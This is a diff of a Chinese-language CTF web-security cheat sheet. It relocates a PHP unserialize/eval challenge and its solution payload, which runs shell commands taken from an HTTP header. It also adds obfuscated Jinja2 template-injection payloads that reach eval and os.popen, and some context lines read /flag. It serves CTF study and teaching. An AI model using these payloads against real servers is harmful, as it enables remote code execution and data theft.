@@ -806,57 +806,6 @@ SELECT * FROM users WHERE username='vampire     ';
 
 - 如果 127.0.0.1 被过滤，可以使用 sudo.cc 替代。127.0.0.1 还可以写成 127.1    。http://0.0.0.0 可以写成 http://0 (上面 SSRF 的短总结写了所以过滤)
 
-##### 特殊情况: Headers 注入 (只允许使用函数注入，且函数内不能有参数)
-
-例题
-
-- 这个正则表达式只允许使用函数，且函数内不能有参数
-
-```php
-<?php
-highlight_file(__FILE__);
-error_reporting(0);
-class Test
-{
-    public $value;
-    public function __destruct(){
-        $this->backdoor();
-    }
-    public function backdoor(){
-        if("yu22x"===preg_replace('/;+/',"yu22x",preg_replace("/[A-Za-z_]+\(+|\)/","",$this->value))){
-           eval($this->value."yu22x");
-       }
-    }
-
-}
-unserialize($_GET['pop']);
-```
-
-答案
-
-```php
-<?php
-    class Test
-    {
-        public $value;
-
-    }
-    $a = new Test();
-    $a->value='system(current(getallheaders()));__halt_compiler();';
-    echo serialize($a);
-?>
-```
-
-`system(current(getallheaders()))` 这段的意思是用 system() 执行 HTTP Headers 中的第一个参数的值。(这里只能使用 burp 设置 HTTP Headers，因为要保证该 header 在 HTTP Headers 的第一个位置) 。
-
-`__halt_compiler()` :这个函数会立即停止编译器的执行。这是为了防止服务器执行我们不希望执行的代码，例如 "yu22x"，因为在 `backdoor` 函数中，我们的代码后面会被添加上 "yu22x"。
-
-如图:
-
-![](static/img/headers注入.jpg)
-
-此处的 `x` (键名)无所谓，可以是任意值。
-
 #### 文件漏洞
 
 - 在做题的时候尽量多试几个题目的提示后缀​（如 index.php、source.php）
@@ -1400,6 +1349,57 @@ Python的攻击代码利用了这个缺陷。它首先构造了一个 JSON 对�
 ```
 
 是内联执行。在这里，它们被用来结束当前的 PHP 代码块并立即开始一个新的 PHP 代码块。这是因为在 eval 函数中执行的代码将被插入到当前的 PHP 代码块中，如果不使用这些标签，那么插入的代码可能会与当前的 PHP 代码混淆，导致语法错误。
+
+##### 特殊情况: Headers 注入 (只允许使用函数注入，且函数内不能有参数)
+
+例题
+
+- 这个正则表达式只允许使用函数，且函数内不能有参数
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+class Test
+{
+    public $value;
+    public function __destruct(){
+        $this->backdoor();
+    }
+    public function backdoor(){
+        if("yu22x"===preg_replace('/;+/',"yu22x",preg_replace("/[A-Za-z_]+\(+|\)/","",$this->value))){
+           eval($this->value."yu22x");
+       }
+    }
+
+}
+unserialize($_GET['pop']);
+```
+
+答案
+
+```php
+<?php
+    class Test
+    {
+        public $value;
+
+    }
+    $a = new Test();
+    $a->value='system(current(getallheaders()));__halt_compiler();';
+    echo serialize($a);
+?>
+```
+
+`system(current(getallheaders()))` 这段的意思是用 system() 执行 HTTP Headers 中的第一个参数的值。(这里只能使用 burp 设置 HTTP Headers，因为要保证该 header 在 HTTP Headers 的第一个位置) 。
+
+`__halt_compiler()` :这个函数会立即停止编译器的执行。这是为了防止服务器执行我们不希望执行的代码，例如 "yu22x"，因为在 `backdoor` 函数中，我们的代码后面会被添加上 "yu22x"。
+
+如图:
+
+![](static/img/headers注入.jpg)
+
+此处的 `x` (键名)无所谓，可以是任意值。
 
 #### 执行系统命令
 
@@ -2442,6 +2442,8 @@ http://xxx/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG
 
 ##### 执行系统命令
 
+方法一
+
 建议根据下面一点一点试（下面的示例层层递进？）
 
 ```
@@ -2467,9 +2469,12 @@ http://xxx/?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(r
 
 # 继续 过滤了request，但是是再{{}}中过滤了request，没有在{% %}过滤request
 http://xxx/?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
+
+# 过滤了非常多函数
+http://xxx/?name={{''['__cl'+'ass__'].__bases__[0]['__subcl'+'asses__']()[383].__init__.__globals__['__bui'+'ltins__']['ev'+'al']("__im"+"port__('o'+'s').po"+"pen('ls /').read()")}}
 ```
 
-在上面的基础上，基本啥都被绕过了
+方法二
 
 ```
 http://xxx/?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%}
